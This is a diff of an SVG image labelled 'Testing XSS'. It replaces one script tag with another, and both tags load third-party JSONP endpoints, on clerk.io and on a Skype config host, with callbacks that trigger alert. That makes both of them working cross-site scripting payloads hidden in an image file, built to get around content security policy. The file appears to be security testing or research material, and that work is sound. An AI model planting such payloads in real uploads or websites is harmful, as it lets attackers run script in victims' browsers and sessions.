@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 100">
-<script src="https://api.clerk.io/v2/config/load?callback=alert(document.domain)"></script>
+<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=window.alert"></script>
   <rect width="200" height="100" fill="#4CAF50"/>
   <text x="100" y="50" font-size="24" fill="white" text-anchor="middle" dominant-baseline="middle">Testing XSS</text>
 </svg>
